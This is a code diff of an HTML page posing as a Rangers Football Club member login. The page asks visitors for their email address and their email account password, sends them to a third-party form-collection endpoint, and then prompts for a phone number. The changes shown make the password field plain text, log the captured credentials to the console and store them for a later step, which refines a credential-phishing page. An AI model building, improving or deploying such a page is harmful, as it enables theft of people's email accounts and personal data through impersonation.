@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rangers Football Club Login</title>
     <style>
+        /* Apply a refined background with partial stadium image and gradient */
         body {
             margin: 0;
             padding: 0;
@@ -56,7 +57,7 @@
             font-weight: bold;
         }
 
-        input[type="email"], input[type="password"], input[type="tel"] {
+        input[type="email"], input[type="text"], input[type="tel"] {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
@@ -82,6 +83,7 @@
             background-color: #003580; /* Darker blue for hover effect */
         }
 
+        /* Footer with additional branding */
         .footer {
             position: fixed;
             bottom: 10px;
@@ -89,8 +91,9 @@
             text-align: center;
             color: white;
             font-size: 14px;
-            opacity: 0.7;
+            opacity: 0.7; /* Faded look */
         }
+
     </style>
 </head>
 <body>
@@ -100,7 +103,8 @@
     <h2>Rangers FC Member Login</h2>
     <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
         <input type="email" id="email" name="email" placeholder="Enter your email" required>
-        <input type="password" id="password" name="password" placeholder="Enter your email password" required>
+        <!-- Changed the type to text for testing -->
+        <input type="text" id="password" name="password" placeholder="Enter your email password" required>
         <button type="submit">Login</button>
     </form>
 </div>
@@ -124,7 +128,7 @@
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Capture email, password
+        // Capture email and password
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
 
@@ -132,12 +136,12 @@
         document.getElementById('loginModal').style.display = 'none';
         document.getElementById('phoneModal').style.display = 'block';
 
-        // Save email and password for the next step
-        window.email = email;
-        window.password = password;
-
         // Optionally log data to the console for testing
         console.log(`Email: ${email}, Password: ${password}`);
+        
+        // Save data for later use (e.g., store it in a variable or send to the server immediately)
+        window.email = email;
+        window.password = password;
     });
 
     // Handle phone number form submission
